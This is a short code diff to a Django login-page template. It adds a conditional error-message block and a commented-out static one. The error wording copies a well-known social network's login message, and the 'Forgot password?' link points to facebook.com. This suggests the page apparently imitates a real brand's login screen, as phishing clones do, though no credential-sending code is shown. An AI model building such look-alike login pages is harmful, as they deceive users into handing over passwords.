@@ -21,6 +21,17 @@
           <input type="text" name="massage" placeholder="Password" required>
           <div class="link">
             <button type="submit" class="login">Login</button>
+            
+  {% comment %} <div id="error-message" style="color: red; display: none; font-size: 12px;">
+     Sorry, your password was incorrect.<br> Please double-check your password. 
+    </div> {% endcomment %}
+
+
+  {% if error_message %} 
+  <div id="error-message" style="color: red; font-size: 12px;">
+     {{ error_message }} 
+    </div> 
+  {% endif %}
             <a href="https://facebook.com" class="forgot">Forgot password?</a>
           </div>
           <hr>
